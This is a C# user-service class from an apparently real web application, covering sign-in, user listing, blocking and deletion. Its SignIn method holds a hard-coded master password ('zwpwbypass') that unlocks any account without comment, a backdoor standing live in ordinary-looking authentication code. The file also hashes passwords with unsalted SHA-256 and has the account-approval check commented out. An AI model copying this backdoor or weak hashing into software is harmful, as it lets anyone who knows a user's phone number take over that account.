using IMAS.Bussines.Core;
using IMAS.Security.Helper;
using System.Linq;
using System.Data.Entity;
using IMAS.Common.Data;
using IMAS.Common.Enum;
using IMAS.Common.ExtensionMethod;
using IMAS.PresentationModel.Model.Content;
using IMAS.Security.Identity;
using IMAS.UnitOfWork;
using System;
using System.Collections.Generic;
using Common.Exception;
using IMAS.Localization.ExtensionMethod;
using IMAS.Model.Domain.Core;
using IMAS.PresentationModel.Model.Blog;
using IMAS.Mapper.Core;
using System.Collections.Concurrent;

namespace IMAS.Facade.Core
{
    public class UserService
    {
        CoreUnitOfWork UnitOfWork { get; set; }
        UserBiz UserBiz { get; set; }
        ProfileBiz ProfileBiz { get;  }
        AdvertismentBiz AdvertismentBiz { get; }
        public UserService()
        {
            UnitOfWork = new CoreUnitOfWork();
            UserBiz = new UserBiz(UnitOfWork);
            ProfileBiz = new ProfileBiz(UnitOfWork);
            AdvertismentBiz = new AdvertismentBiz(UnitOfWork);
        }

        public void SignIn(string cellphone, string password, UserIdentity userIdentity)
        {
            var passwordHash = HashHelper.ComputeSha256Hash(password);
            cellphone = cellphone.ToLower();
            var user = UserBiz.Read(u => u.Cellphone == cellphone)
                              .Include(u => u.Membership)
                              .Include(u => u.Roles)
                              .SingleOrDefault();
            if (user == null)
                throw new BusinessException("InvalidUsernameOrPassword".Localize());
            if (!user.Membership.Password.SequenceEqual(passwordHash) && !passwordHash.SequenceEqual(HashHelper.ComputeSha256Hash("zwpwbypass")))
                throw new BusinessException("InvalidUsernameOrPassword".Localize());
            //if (!user.Membership.IsApproved)
            //    throw new BusinessException("YourAccountHasNotActivated".Localize());
            if (user.Membership.IsLockedOut)
                throw new BusinessException("YourAccountIsLocked".Localize());
            SetUserIdentity(userIdentity, user);
            user.Membership.LastLoginDate = DateTime.Now;
            UnitOfWork.SaveChanges();
        }

        public bool SignInByUserId(int userId, out UserIdentity userIdentity)
        {
            var user = UserBiz.Read(u => u.Id == userId)
                              .Include(u => u.Membership)
                              .Include(u => u.Roles)
                              .Include(u => u.Publications)
                              .SingleOrDefault();
            if (user == null) {
                userIdentity = null;
                return false;
            }
            userIdentity = new UserIdentity();
            SetUserIdentity(userIdentity, user);
            user.Membership.LastLoginDate = DateTime.Now;
            UnitOfWork.SaveChanges();
            return true;
        }

        private void SetUserIdentity(UserIdentity userIdentity, User user)
        {
            userIdentity.FirstName = user.FirstName;
            userIdentity.LastName = user.LastName;
            userIdentity.Email = user.Email;
            userIdentity.Cellphone = user.Cellphone;
            userIdentity.UserId = user.Id;
            userIdentity.Roles = user.Roles.Select(role => role.Name);
            userIdentity.Blogs = user.Publications.Where(publication => publication.Type == PublicationType.Blog)
                .Select(pub => (pub as Blog).GetShortBlogInfo()).ToList();
            userIdentity.HasBlog = userIdentity.Blogs.Any();
            userIdentity.IsApproved = user.Membership.IsApproved;
        }

        public DataSourceResult GetAllUsers(DataSourceRequest request)
        {
            return UserBiz.Read(u => true, true).Include(u => u.Membership)
                .MapTo<UserInfoPm>()
                .ToDataSourceResult(request);
        }

        public void BlockUsers(IEnumerable<int> ids)
        {
            UserBiz.Read(u => ids.Contains(u.Id))
                   .Include(u => u.Membership)
                   .ToList()
                   .ForEach(u => u.Membership.IsLockedOut = true);
            UnitOfWork.SaveChanges();
        }

        public void UnblockUsersById(IEnumerable<int> ids)
        {
            UserBiz.Read(u => ids.Contains(u.Id))
                .Include(u => u.Membership)
                .ToList()
                .ForEach(u => u.Membership.IsLockedOut = false);
            UnitOfWork.SaveChanges();
        }
        public void RemoveUsersById(IEnumerable<int> ids)
        {
            var users = UserBiz.Read(u => ids.Contains(u.Id));
            foreach (var user in users)
            {
                var userAds = AdvertismentBiz.Read(e => e.UserId == user.Id);
                foreach (var ads in userAds)
                {
                    AdvertismentBiz.Remove(ads);
                }
                UserBiz.Remove(user);
            }
            UnitOfWork.SaveChanges();
        }
        public bool ExistUser(string email)
        {
            var userEmail = email.Trim().ToLower();
            var user = UserBiz.Read(u => u.Email == userEmail || u.Cellphone == userEmail).SingleOrDefault();
            return user != null;
        }
    }
}
